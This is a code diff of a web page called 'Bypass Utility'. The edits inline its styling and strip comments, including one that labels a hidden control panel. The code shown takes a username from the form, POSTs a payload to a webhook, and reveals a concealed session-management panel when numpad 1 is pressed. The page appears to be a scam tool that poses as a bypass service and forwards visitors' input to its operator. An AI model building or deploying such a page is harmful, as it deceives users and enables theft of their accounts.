@@ -4,7 +4,106 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Bypass Utility</title>
-  <link rel="stylesheet" href="styles.css" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #f0f0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+    }
+    h1 {
+      margin-bottom: 20px;
+      font-size: 2rem;
+      color: #00fff7;
+    }
+    .form-container {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+      width: 100%;
+      max-width: 500px;
+    }
+    input[type="text"], button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+    }
+    input[type="text"] {
+      background-color: #1a1a1a;
+      color: #00fff7;
+      border: 1px solid #00fff7;
+    }
+    button {
+      background-color: #00fff7;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #00cccc;
+    }
+    .note {
+      font-size: 0.85rem;
+      color: #ccc;
+      text-align: center;
+    }
+    #controlPanel, #overlay {
+      display: none;
+    }
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.8);
+      z-index: 1000;
+    }
+    #controlPanel {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #111;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
+      z-index: 1001;
+      max-height: 80vh;
+      overflow-y: auto;
+      width: 90%;
+      max-width: 600px;
+    }
+    #controlPanel h2 {
+      color: #00fff7;
+      margin-bottom: 15px;
+    }
+    .session {
+      background-color: #222;
+      margin-bottom: 10px;
+      padding: 10px;
+      border-radius: 6px;
+      border-left: 4px solid #00fff7;
+    }
+    .session button {
+      margin-top: 5px;
+    }
+  </style>
 </head>
 <body>
 
@@ -20,7 +119,6 @@
   </form>
 </div>
 
-<!-- Hidden Control Panel -->
 <div id="overlay"></div>
 <div id="controlPanel">
   <h2>[ Control Panel ]</h2>
@@ -42,9 +140,6 @@ function sendToWebhook(url, payload) {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
-  })
-  .then(res => {
-    if (!res.ok) throw new Error("Failed to send");
   })
   .catch(console.error);
 }
@@ -96,10 +191,7 @@ function declineSession(index) {
   }
 }
 
-// Form submission handler
-
-const form = document.getElementById("bypassForm");
-form.addEventListener("submit", function(e) {
+document.getElementById("bypassForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
   const username = document.getElementById("usernameInput").value;
@@ -138,17 +230,13 @@ form.addEventListener("submit", function(e) {
   }
 });
 
-// Toggle control panel with Numpad 1
-
 document.addEventListener("keydown", (e) => {
   if (e.key === "1" && e.location === 3) {
     const panel = document.getElementById("controlPanel");
     const overlay = document.getElementById("overlay");
-
     const isOpen = panel.style.display === "block";
     panel.style.display = isOpen ? "none" : "block";
     overlay.style.display = isOpen ? "none" : "block";
-
     if (!isOpen) updateControlPanel();
   }
 });
